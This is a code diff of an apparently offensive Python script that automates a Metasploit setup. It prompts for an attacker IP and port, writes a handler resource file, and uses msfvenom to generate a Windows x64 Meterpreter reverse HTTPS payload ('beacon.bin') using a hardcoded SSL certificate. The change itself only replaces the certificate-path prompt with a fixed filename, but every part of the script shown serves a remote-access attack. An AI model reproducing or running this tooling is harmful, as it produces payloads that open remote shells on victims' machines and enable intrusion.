@@ -165,7 +165,7 @@ except subprocess.CalledProcessError as e:
 # Prompt attacker for IP, port, and certificate file
 attacker_ip = input("Enter the attacker's IP: ")
 attacker_port = input("Enter the attacker's port: ")
-certificate_file = input("Enter the path to the certificate file (www.example.com.pem): ")
+
 
 # Create msfconfig.rc
 msfconfig_content = f'''
@@ -174,7 +174,7 @@ set PAYLOAD windows/x64/meterpreter/reverse_https
 set LHOST {attacker_ip}
 set LPORT {attacker_port}
 set StagerVerifySSLCert true
-set HandlerSSLCert {certificate_file}
+set HandlerSSLCert www.example.com.pem
 run
 '''
 
@@ -186,7 +186,7 @@ print("msfconfig.rc created.")
 
 # Generate the beacon.bin payload using msfvenom
 payload_file = 'beacon.bin'
-payload_command = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={attacker_ip} LPORT={attacker_port} HandlerSSLCert={certificate_file} StagerVerifySSLCert=true -f raw -o {payload_file}"
+payload_command = f"msfvenom -p windows/x64/meterpreter/reverse_https LHOST={attacker_ip} LPORT={attacker_port} HandlerSSLCert=www.example.com.pem StagerVerifySSLCert=true -f raw -o {payload_file}"
 subprocess.run(payload_command, shell=True)
 
 # Execute msfconsole with the resource file
